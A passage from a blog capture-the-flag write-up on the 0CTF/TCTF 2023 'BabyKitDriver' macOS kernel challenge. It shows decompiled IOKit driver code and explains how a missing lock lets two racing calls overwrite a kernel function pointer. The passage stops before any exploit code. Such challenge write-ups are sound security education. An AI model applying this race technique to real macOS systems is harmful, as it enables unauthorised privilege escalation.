<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>0CTF/TCTF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="0CTF/TCTF 2023">
  <meta name="twitter:description" content="Writeup for 0CTF/TCTF 2023">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/0ctf-tctf-2023/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="0CTF/TCTF 2023">
  <meta property="og:description" content="Writeup for 0CTF/TCTF 2023">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-12-11T04:56:22+07:00">
    <meta property="article:modified_time" content="2023-12-11T11:46:04+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="0CTF">
    <meta property="article:tag" content="TCTF">
    <meta property="article:tag" content="0CTF/TCTF">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Kernel">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/0ctf-tctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/cyber-jawara-2023/" /><link rel="next" href="https://chovid99.github.io/posts/asis-ctf-finals-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "0CTF/TCTF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/0ctf-tctf-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, 0CTF, TCTF, 0CTF\/TCTF, pwn, kernel, race, macOS, lpe, oob, 2023","wordcount":  6598 ,
        "url": "https:\/\/chovid99.github.io\/posts\/0ctf-tctf-2023\/","datePublished": "2023-12-11T04:56:22+07:00","dateModified": "2023-12-11T11:46:04+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">0CTF/TCTF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Dec 11, 2023">Dec 11, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6598 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;31 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#babykitdriver">BabyKitDriver</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#setup-debug-environment">Setup Debug Environment</a></li>
                <li><a href="#getting-leak">Getting Leak</a></li>
                <li><a href="#crafting-rop-chain">Crafting ROP Chain</a></li>
                <li><a href="#trigger-race">Trigger Race</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/3fSpAEk.png" title="https://i.imgur.com/3fSpAEk.png" data-thumbnail="https://i.imgur.com/3fSpAEk.png" data-sub-html="<h2>0CTF/TCTF 2023. We secured the first place</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/3fSpAEk.png"
            data-srcset="https://i.imgur.com/3fSpAEk.png, https://i.imgur.com/3fSpAEk.png 1.5x, https://i.imgur.com/3fSpAEk.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/3fSpAEk.png" />
    </a><figcaption class="image-caption">0CTF/TCTF 2023. We secured the first place</figcaption>
    </figure>
<p>I played with the <strong>Blue Water</strong> team in the 0CTF/TCTF 2023. We managed to secure the <strong>first place</strong>. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during it!</p>
<p>Below is the writeup for the kernel pwn challenge called <code>BabyKitDriver</code>, which is a macOS Local Privilege Escalation challenge.</p>
<h1 id="pwn">Pwn</h1>
<h2 id="babykitdriver">BabyKitDriver</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>qemu+macOS ventura 13.6.1</p>
<p>upload your exploit binary and the server will run it for you, you can get the output of your exploit.</p>
<p>the flag is at /flag</p>
<p>Just pwn my first IOKit Driver!</p>
<p>nc baby-kit-driver.ctf.0ops.sjtu.cn 20001</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we were given a <code>kext</code> folder which is a driver of macOS kernel. Based on the challenge description, seems like the given driver is an IOKit Driver. Our goal is to pwn the driver, so that we can do local privilege escalation in macOS through the vulnerable driver.</p>
<p>There aren&rsquo;t too many resources in the internet about it, but we found a good <a href="https://trungnguyen1909.github.io/blog/post/DEFCON26-Qual/iPwnKit/" target="_blank" rel="noopener noreffer ">writeup</a> which mentioned a book that can be read to understand the basic of how to communicate with IOKit driver. The book name is &ldquo;OS X and iOS Kernel Programming&rdquo;, which is very recommended to be read to help understand this challenge (Especially the chapter 5).</p>
<p>Let&rsquo;s start by disassembling the given driver. We observed that there are two main class exists on there, which is <code>BabyKitDriver</code> and <code>BabyKitDriverUserClient</code>. The book already mentioned that this is the typical of how IOKit driver looks like.</p>
<img src="https://i.imgur.com/TQcQJFD.png"/>
<p>Checking through the <code>BabyKitDriver</code> class, seems like there aren&rsquo;t any interesting things, so we can shift our focus towards <code>BabyKitDriverUserClient</code> class, which is the one that we can interact with.</p>
<p>Let&rsquo;s start by checking the <code>BabyKitDriverUserClient::externalMethod</code> first, which will list the available methods that user can call from userland.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">BabyKitDriverUserClient</span><span class="o">::</span><span class="nf">externalMethod</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">OSObject</span> <span class="o">*</span><span class="n">this</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">selector</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">IOExternalMethodArguments</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">IOExternalMethodDispatch</span> <span class="o">*</span><span class="n">dispatch</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">OSObject</span> <span class="o">*</span><span class="n">target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">reference</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOLog</span><span class="p">(</span><span class="s">&#34;BabyKitDriverUserClient::externalMethod</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">selector</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">BabyKitDriverUserClient</span> <span class="o">*</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="p">,</span> <span class="n">IOExternalMethodArguments</span> <span class="o">*</span><span class="p">,</span> <span class="n">IOExternalMethodDispatch</span> <span class="o">*</span><span class="p">,</span> <span class="n">OSObject</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="err">`</span><span class="n">vtable</span> <span class="k">for</span><span class="err">&#39;</span><span class="n">IOUserClient</span><span class="p">.</span><span class="n">externalMethod</span><span class="p">)(</span>
</span></span><span class="line"><span class="cl">             <span class="p">(</span><span class="n">BabyKitDriverUserClient</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">selector</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">args</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="p">(</span><span class="n">IOExternalMethodDispatch</span> <span class="o">*</span><span class="p">)</span><span class="n">BabyKitDriverUserClient</span><span class="o">::</span><span class="n">sMethods</span> <span class="o">+</span> <span class="n">selector</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="n">this</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xE00002C7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Taking a glance, seems like there are only two functions that we can interact with. Checking through the <code>sMethods</code>, which basically a list of <code>IOExternalMethodDispatch</code>, we can see that there are two functions that we can interact:</p>
<ul>
<li><code>BabyKitDriverUserClient::baby_read</code>
<ul>
<li>Checking through its attribute, we can call this function by passing 2 scalar inputs with no output.</li>
</ul>
</li>
<li><code>BabyKitDriverUserClient::baby_leaveMessage</code>
<ul>
<li>Checking through its attribute, we can call this function by passing 3 scalar inputs with no output.</li>
</ul>
</li>
</ul>
<p>Let&rsquo;s start by checking the <code>baby_leaveMessage</code> code first.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">BabyKitDriverUserClient</span><span class="o">::</span><span class="nf">baby_leaveMessage</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">OSObject</span> <span class="o">*</span><span class="n">target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">reference</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">IOExternalMethodArguments</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-80h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-74h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint64_t</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-70h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-68h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">OSObject</span> <span class="o">*</span><span class="p">))</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">__vftable</span><span class="p">[</span><span class="mi">5</span><span class="p">].</span><span class="n">_RESERVEDOSObject14</span><span class="p">)(</span><span class="n">target</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="o">*</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IOLog</span><span class="p">(</span><span class="s">&#34;BabyKitDriverUserClient::baby_leaveMessage</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="nf">IOMalloc</span><span class="p">(</span><span class="mh">0x300uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">output2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="n">output1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">output2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="mh">0x200LL</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="mh">0x200LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">copyin</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10LL</span><span class="p">),</span> <span class="n">v4</span><span class="p">);</span><span class="c1">// 2nd arg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="n">output1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">copyin</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">scalarInput</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">),</span> <span class="mh">0x100uLL</span><span class="p">);</span><span class="c1">// 2nd arg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">output1</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__memcpy_chk</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="mh">0x100LL</span><span class="p">,</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">output2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__memcpy_chk</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking through the above code, this function will try to allocate a heap <code>chunk</code> during the first time it was called, and store it into <code>v7 +0x90</code>. Based on our first argument, it will store a function pointer to <code>chunk+0x0</code> or <code>chunk+0x8</code>, depends whether our first argument is 0 or not. This function will also do <code>copyin</code>, which will copy the contents of userland address that we passed in second argument. Regarding the size, if our first argument is not zero, we can specify the data size (as long as it is not larger than <code>0x200</code>), else, the size is fixed at <code>0x100</code>. It will also stored our first argument as well at <code>v7+0x98</code>.</p>
<p>Observed that there aren&rsquo;t any locks implemented in this driver. There is a race condition that can be triggered here. Observed that if we can race between <code>baby_leaveMessage(0,,)</code> and <code>baby_leaveMessage(1,,)</code>, there can be an inconsistent state where:</p>
<ul>
<li><code>baby_leaveMessage(1,,)</code> caused the stored <code>*(_QWORD *)(v7 + 0x98)</code> to be <code>1</code>.</li>
<li>Yet, <code>baby_leaveMessage(0,,)</code> overwrite the function pointer in <code>*(_QWORD *)(*(_QWORD *)(v7 + 0x90) + 8LL)</code>, because for <code>0</code> case, the write start from <code>chunk+0x8</code>.</li>
</ul>
<p>Now, let&rsquo;s check the <code>baby_read</code> function so that we can know what can we do with the race.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">BabyKitDriverUserClient</span><span class="o">::</span><span class="nf">baby_read</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">OSObject</span> <span class="o">*</span><span class="n">target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">reference</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">IOExternalMethodArguments</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-398h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-388h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-380h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v10</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [rsp+A0h] [rbp-310h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">__b</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [rsp+2A0h] [rbp-110h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">OSObject</span> <span class="o">*</span><span class="p">))</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">__vftable</span><span class="p">[</span><span class="mi">5</span><span class="p">].</span><span class="n">_RESERVEDOSObject14</span><span class="p">)(</span><span class="n">target</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">);</span>
